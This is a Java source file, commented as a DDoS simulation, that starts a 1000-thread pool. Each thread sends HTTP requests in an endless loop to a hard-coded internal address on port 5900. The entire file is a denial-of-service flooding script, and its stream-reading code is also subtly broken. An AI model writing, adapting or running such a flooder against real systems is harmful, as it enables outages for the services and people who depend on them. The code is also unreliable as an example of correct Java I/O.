


import org.apache.log4j.Logger;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 模拟DDOS
 */
public class DDos {
   private static final Logger logger = Logger.getLogger(DDos.class);
    public static void main(String[] args) {
        ExecutorService es = Executors.newFixedThreadPool(1000);
    Mythread mythread = new Mythread();
    mythread.setDestPath("http://10.0.152.207:5900");
    Thread thread =new Thread(mythread);
    for (int i = 0;i<1000;i++){
        es.execute(thread);
    }
    }
    static class Mythread implements  Runnable{

      private String destPath;

        public String getDestPath() {
            return destPath;
        }

        public void setDestPath(String destPath) {
            this.destPath = destPath;
        }

        @Override
        public void run() {
            while (true){
                try {
                    URL url = new URL(destPath);
                    URLConnection conn = url.openConnection();

                    BufferedInputStream bis = new BufferedInputStream(
                            conn.getInputStream()
                    );
                    byte[] bytes = new byte[1024*1024];
                    int len = -1 ;
                    StringBuffer sb = new StringBuffer();
                    if (bis!=null){
                        if ((len=bis.read())!=-1){
                            sb.append(new String(bytes,0,len));
                            bis.close();
                        }
                    }

                } catch (MalformedURLException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    logger.error("url连接异常",e);
                }
            }


        }
    }


}
